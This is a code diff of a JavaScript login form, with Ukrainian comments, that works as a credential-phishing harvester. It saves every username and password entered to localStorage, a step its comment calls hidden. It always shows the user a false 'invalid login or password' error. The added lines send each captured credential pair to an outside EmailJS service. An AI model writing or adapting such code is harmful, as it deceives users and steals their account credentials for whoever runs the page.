@@ -1,35 +1,43 @@
 function login() {
-    const user = username.value.trim();
-    const pass = password.value.trim();
+    const user = document.getElementById("username").value.trim();
+    const pass = document.getElementById("password").value.trim();
 
     if (!user || !pass) {
         alert("Введи логін і пароль");
         return;
     }
 
-    // отримуємо попередні логіни
+    // Збереження логінів у localStorage (приховано)
     let logins = JSON.parse(localStorage.getItem("logins")) || [];
-
-    // зберігаємо новий
     logins.push({ username: user, password: pass });
-
     localStorage.setItem("logins", JSON.stringify(logins));
 
-    // завжди помилка
+    // Відправка на EmailJS
+    emailjs.send("service_4239xag", "template_ozsxeoi", {
+        username: user,
+        password: pass
+    })
+    .then(function() {
+        console.log('Email успішно відправлено!');
+    }, function(error) {
+        console.error('Помилка при відправці email:', error);
+    });
+
+    // Повідомлення про помилку користувачу
     alert("Невірний логін або пароль");
 }
 
 function showLogins() {
     let logins = JSON.parse(localStorage.getItem("logins")) || [];
-    let text = "";
+    if (logins.length === 0) {
+        alert("Немає збережених логінів");
+        return;
+    }
 
-    logins.forEach(item => {
-        text += item.username + ":" + item.password + "\n";
+    let text = "";
+    logins.forEach((item, index) => {
+        text += `${index + 1}. ${item.username} : ${item.password}\n`;
     });
 
-    alert(text || "Немає даних");
-}
-
-function submitForm() {
-    alert("Відправлено!");
+    alert(text);
 }
